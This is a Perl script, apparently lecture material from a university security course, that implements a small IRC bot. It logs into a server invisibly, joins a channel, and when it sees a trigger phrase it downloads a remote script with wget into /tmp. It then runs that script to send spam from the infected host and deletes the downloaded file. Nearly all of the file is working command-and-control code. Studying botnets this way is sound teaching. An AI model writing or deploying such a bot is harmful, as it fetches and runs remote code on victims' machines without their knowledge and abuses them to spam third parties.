#!/usr/bin/perl -w

##   miniBot.pl

##   A silly little bot by Avi Kak  (kak@purdue.edu)
##
##   This is derived from the script ircClient.pl presented in Section 28.4
##   of Lecture28 notes.  The script uses code from Paul Mutton's script "A
##   Simple Perl IRC Client" and user feedback scriplets that can be
##   downloaded from http://oreilly.com/pub/h/1964.

##   For this bot to make a connection with an IRC server, someone has to
##   execute, knowingly or unknowingly, the following command line:
##
##      miniBot.pl  server_address  port  nick  channel
##

##   This is a mini bot because it has only one exploit programmed into it:
##   the bot sends out spam to a third-party mailing list.  However, for
##   that work, the host "infected" by this bot must have the sendmail MTA
##   running.

##   The bot's exploit is triggered when it receives the following string
##
##         abracadabra magic mailer
##
##   from the IRC channel it is connected to.  Note that the bot logs into
##   the IRC server via the USER command:
##
##        USER  $login  8  *  :some text
##
##   as shown in line (O).  As stated in RFC 2812 for IRC, the second
##   argument to the USER command represents a bit mask that determines the
##   various properties of the user in the channel.  Using the number 8
##   would cause the user to become invisible to others in the same
##   channel.

use strict;

use IO::Socket;                                                              #(A)
use Cwd;

die "Usage:  Requires 4 arguments as in\n\n" .
    "        $0   host   port   nick   channel\n\n"
    unless @ARGV == 4;                                                       #(B)

my $server = shift;                                                          #(C)
my $port = shift;                                                            #(D)
my $nick = shift;                                                            #(E)
my $login = $nick;                                                           #(F)
my $channel = shift;                                                         #(G)

my $sock = IO::Socket::INET->new(PeerAddr =>$server,                         #(H)
                                 PeerPort =>$port,                           #(I)
                                 Proto => 'tcp') or                          #(J)
    die;                                                                     #(K)

$SIG{INT} = sub { $sock->close; exit 0; };                                   #(L)
STDOUT->autoflush(1);                                                        #(M)

print $sock "NICK $nick\r\n";                                                #(N)
print $sock "USER $login 8 * :from the miniBot\r\n";                         #(O)

while (my $input = <$sock>) {                                                #(P)
    # Check the numerical responses from the server.
    if ($input =~ /004/) {           # connection established                #(Q)
        last;                                                                #(R)
    } elsif($input =~ /PING/) {                                              #(S)
        if($input =~/:/) {                                                   #(T)
            if(index($input, ":") != -1) {                                   #(U)
                my $digits = substr($input, index($input, ":") + 1, 
                        (length($input) - index($input, ":")));              #(V)
                print $sock "PONG $digits\r\n";                              #(W)
            }
       }
    } elsif ($input =~ /433/) {                                              #(X)
        die;                                                                 #(Y)
    }
}
print $sock "JOIN $channel\r\n";                                             #(Z)
while (my $input = <$sock>) {                                                #(a)
    chop $input;                                                             #(b)
    if ($input =~ /^PING(.*)$/i) {                                           #(c)
        print $sock "PONG $1\r\n";                                           #(d)
    } else {                                                                 #(e)
        $input =~ s/(^[^!]*)![^ ]*/$1/;                                      #(f)
#        print "$input\n";                                                   #(g)
        if ($input =~ "abracadabra magic mailer") {                          #(h)
            my $dir = cwd;                                                   #(i)
            chdir "/tmp";                                                    #(j)
            system("wget http://engineering.purdue.edu/kak/emailer_pl");     #(k)   
            system("perl emailer");                                          #(l)   
            unlink glob "emailer*";                                          #(m)
            chdir $dir;                                                      #(n)
        }
    }
}
